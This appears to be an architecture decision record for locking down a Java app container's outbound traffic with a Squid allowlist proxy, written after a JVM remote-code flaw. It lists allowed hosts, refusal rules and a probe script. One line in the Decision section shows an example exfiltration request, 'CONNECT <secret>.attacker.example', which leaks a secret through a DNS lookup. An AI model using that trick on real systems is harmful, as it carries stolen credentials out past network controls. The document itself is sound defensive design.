# ADR-029: Egress Allowlist for the App Container

> Design: [`docs/plans/2026-11-25-egress-proxy-design.md`](../plans/2026-11-25-egress-proxy-design.md).
> Origin: [Java4Shell hardening plan](../plans/2026-11-19-java4shell-hardening-plan.md), WI-3.

Status: Accepted (2026-11-25)

Relates to [ADR-027](ADR-027-cloudflare-edge-and-abuse-protection.md) (the tunnel-only origin,
which governs the way *in*) and [ADR-028](ADR-028-secrets-and-model-spend-protection.md) (the
model credential and its spend ceilings). This ADR governs the way *out*.

## Context

The app holds the model credential in process memory, and the database credential, user photos and
account rows within reach. Java4Shell (CVE-2026-114938) showed that a JDK flaw can turn a request
into code running inside the JVM. The pinned runtime is patched (WI-2), but the next such flaw is a
matter of time. Whatever runs inside the JVM can read the credential no matter where it came from,
so the remaining defence is to limit where it can send what it reads. Until now the app container
could open a connection to any host on the internet and resolve any name.

## Decision

### The app has no route out

`compose.yaml` declares an `internal: true` network. `app`, `db` and `db-init` sit on it alone: no
route out, and Docker's DNS answers container names only, so DNS is closed as a leak path too. That
DNS behaviour needs **Docker Engine 26 or later** on the host.

### One allowlist proxy is the only way out

`egress-proxy` (Squid, Canonical's `ubuntu/squid` image pinned by tag and digest) sits on `internal`
and `default`. It allows `CONNECT` tunnels only, to these destinations:

| Host | Port | Used by |
| --- | --- | --- |
| `api.anthropic.com` | 443 | `AnthropicVisionService`, `AnthropicTextGenerationService` |
| `challenges.cloudflare.com` | 443 | `TurnstileChallengeVerifier` |
| `${SPRING_MAIL_HOST}` | `${SPRING_MAIL_PORT}` | `SmtpEmailSender` (production only) |

It also refuses plain HTTP, IP literals, and any destination in a private, loopback or link-local
range: the cloud provider's metadata address, or an allowed name that has been made to resolve
inward. **It matches the name before it looks anything up**, so an unlisted name is refused without a
DNS query. Otherwise `CONNECT <secret>.attacker.example` would carry data out through the lookup
alone, even though the tunnel is refused (found in review, 2026-11-25). It never decrypts traffic and holds no TLS key. It logs every request, allowed and refused,
to `docker compose logs egress-proxy`.

### The app is pointed at it by configuration, not code

- `JAVA_OPTS: -Dhttps.proxyHost=egress-proxy -Dhttps.proxyPort=3128`. The vendor SDK's OkHttp client
  and the JDK `HttpClient` both consult `ProxySelector.getDefault()`, which honours these properties.
  `TurnstileChallengeVerifierTest.request_asksTheDefaultProxySelectorWhereToConnect` pins this for
  the JDK client.
- Mail: `SPRING_MAIL_PROPERTIES_MAIL_SMTP_PROXY_HOST` / `_PORT` in `compose.production.yaml`. Jakarta
  Mail tunnels SMTP through the proxy with `CONNECT`.

### Only the app is locked down

Alertmanager (SMTP and the heartbeat ping; its SMTP client cannot use a proxy), cloudflared (the
edge) and Prometheus keep `default` access. None of them takes outside input or holds the model
credential. cloudflared and Prometheus also sit on `internal`, to reach the app. A container does
not route between its networks, so this gives the app no path out.

### It is proved, not assumed

`deploy/egress-proxy/probe.sh` checks each rule from inside a container on `internal`:

- each allowed host tunnels;
- an unlisted host, a listed host on another port, an IP literal, the metadata address and plain
  HTTP are all refused;
- a direct connection out fails;
- an outside name does not resolve;
- in production, the mail host tunnels, and the check tells a proxy refusal (403) apart from a
  network or provider block (502/503).

`image.yml` runs it against the proxy on every change to the compose files or `deploy/egress-proxy/`.
`deploy/egress-proxy/check.sh` runs it inside the live app after every deploy.

## Consequences

- **Adding an outside host** is one line in `deploy/egress-proxy/squid.conf.template` plus a row in
  the table above, and nothing else. The real EOL client (external-authority Phase 4) will need one.
  An unlisted call fails as a refused tunnel (403 in the proxy log), not silently.
- **Data can still be pushed to an allowed host**, for example to the model vendor under our
  credential. ADR-028's spend ceilings bound that. A refused tunnel in the proxy log is a signal
  worth alerting on, which is not done yet.
- **Locally**, the override also puts `app` and `db` on `default`, because Docker publishes no port
  for a container that is only on an internal network. HTTPS still goes through the proxy, so the
  wiring is exercised. The no-route-out half is real only in production, and `check.sh` says so.
- **DigitalOcean blocks outbound SMTP ports** (25, 465, 587) on new Droplets. The mail rule follows
  `SPRING_MAIL_PORT`, so a provider on port 2525 works without a config change. The choice belongs to
  launch 2.4.
- **The proxy is a new runtime part.** If it is down, identification, sign-up mail and the login
  challenge fail. The challenge fails closed, per ADR-027 D6. The app waits for the proxy's
  healthcheck before it starts, and `restart: unless-stopped` covers crashes. It takes about 12 MB.

## Rejected alternatives

| Alternative | Why rejected |
| --- | --- |
| tinyproxy | No official image: we would build and pin our own, and Dependabot can't update the package inside it. Weaker logs. |
| Smokescreen (Stripe) | Purpose-built, but no published image: we would build a Go project from source. |
| SNI pass-through (nginx `stream` + `ssl_preread`) | Needs no client config, but breaks SMTP STARTTLS, whose TLS hostname appears only after the plain-text start. |
| Lock down every container | Alertmanager's SMTP cannot use a proxy, and none of the others holds the model credential or takes outside input. More moving parts for little gain. |
| Host firewall rules (`iptables` / `DOCKER-USER`) by IP | Vendor IPs change, and rules by name need a proxy anyway. They live outside the repo, unreviewed. |
